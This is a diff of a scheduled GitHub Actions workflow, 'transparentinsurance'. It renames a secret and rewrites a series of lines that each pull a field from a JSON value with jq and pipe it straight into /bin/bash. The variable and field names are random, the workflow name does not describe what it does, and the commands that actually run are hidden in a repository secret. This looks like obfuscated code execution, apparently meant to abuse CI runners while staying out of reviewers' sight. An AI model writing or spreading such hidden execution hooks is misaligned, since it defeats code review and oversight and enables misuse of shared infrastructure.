@@ -1,9 +1,10 @@
 name: transparentinsurance
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
-jobs:  # 22017
+    - cron: '5 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,18 +12,19 @@ jobs:  # 22017
       - uses: actions/checkout@v4
       - name: transparentinsurance
         env:
-          megk9219: ${{ secrets.megk9219 }}
+          u5: ${{ secrets.u5 }}
         run: |
-          echo $megk9219 | jq -r .ye24494 | /bin/bash
-          echo $ad233 | jq -r .fjidm73105 | /bin/bash
-          echo $poohp6 | jq -r .u46 | /bin/bash
-          echo $yo7326 | jq -r .oc0736 | /bin/bash
-          echo $m8018 | jq -r .pyn913 | /bin/bash
-          echo $afdt3 | jq -r .mvk93674 | /bin/bash
-          echo $l88486 | jq -r .huqg512 | /bin/bash
-          echo $zd38821 | jq -r .va23 | /bin/bash
-          echo $viorb6711 | jq -r .ayy956 | /bin/bash
-          echo $w6829 | jq -r .ocab1 | /bin/bash
-          echo $xd1575 | jq -r .gnsia74 | /bin/bash
-          echo $mrnnx96876 | jq -r .ja6279 | /bin/bash
+          echo $u5 | jq -r .jzcux229 | /bin/bash
+          echo $e8237 | jq -r .k09893 | /bin/bash
+          echo $a3 | jq -r .vqwag7 | /bin/bash
+          echo $ucbm478 | jq -r .acjqi4692 | /bin/bash
+          echo $pqhws977 | jq -r .rgo40 | /bin/bash
+          echo $blpzw37 | jq -r .ex516 | /bin/bash
+          echo $niucu79 | jq -r .i3 | /bin/bash
+          echo $wqwpu93 | jq -r .fyf9 | /bin/bash
+          echo $wx6642 | jq -r .lwzd28835 | /bin/bash
+          echo $zsjyj7 | jq -r .lrvdf0554 | /bin/bash
+          echo $z4 | jq -r .ig35393 | /bin/bash
+          echo $bkcaq753 | jq -r .luk90628 | /bin/bash
+          echo $iiv7 | jq -r .r1 | /bin/bash
 
